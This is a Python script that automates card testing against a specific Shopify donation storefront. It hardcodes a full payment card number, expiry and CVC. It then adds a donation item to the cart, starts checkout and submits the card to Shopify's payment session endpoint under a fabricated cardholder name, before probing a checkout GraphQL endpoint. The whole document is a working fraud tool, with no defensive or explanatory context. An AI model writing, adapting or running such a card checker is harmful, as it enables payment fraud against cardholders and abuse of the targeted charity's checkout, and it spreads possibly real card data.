import sys, requests, re, json
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

card = '4033060047342909|08|28|667'
n, mm, yy, cvc = card.strip().split('|')
ccx = card.strip()


r = requests.Session()
# STEP 1 - Add to cart
headers1 = {
    'authority': 'wiredministries.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
    'origin': 'https://wiredministries.com',
    'referer': 'https://wiredministries.com/products/donate',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}
data1 = (
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="quantity"\r\n\r\n1\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="add"\r\n\r\n\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
)
res1 = r.post('https://wiredministries.com/cart/add', headers=headers1, data=data1, timeout=15)
print('Step 1 (Add to cart) Status:', res1.status_code, '| Text:', res1.text[:120])

# STEP 2 - Checkout
headers2 = {
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://wiredministries.com',
    'referer': 'https://wiredministries.com/cart',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}
data2 = {'updates[]': '1', 'note': '', 'checkout': 'Check out'}
res2 = r.post('https://wiredministries.com/cart', headers=headers2, data=data2, timeout=15)
print('Step 2 (Cart Checkout) Status:', res2.status_code, '| URL:', res2.url)

# STEP 3 - Deposit Shopify Sessions
headers3 = {
    'accept': 'application/json',
    'content-type': 'application/json',
    'origin': 'https://checkout.shopifycs.com',
    'referer': 'https://checkout.shopifycs.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}
json_data3 = {
    'credit_card': {'number': n, 'month': mm, 'year': yy, 'verification_value': cvc, 'name': 'Tome Annder'},
    'payment_session_scope': 'wiredministries.com'
}
res3 = requests.post('https://deposit.shopifycs.com/sessions', headers=headers3, json=json_data3, timeout=15)
print('Step 3 (Shopify Sessions Deposit) Status:', res3.status_code, '| Body:', res3.text[:200])

# STEP 4 - Check hardcoded GraphQL Token in script
res4 = r.post('https://wiredministries.com/checkouts/unstable/graphql', timeout=15)
print('Step 4 (Shopify Checkouts GraphQL) Status:', res4.status_code, '| Body:', res4.text[:200])
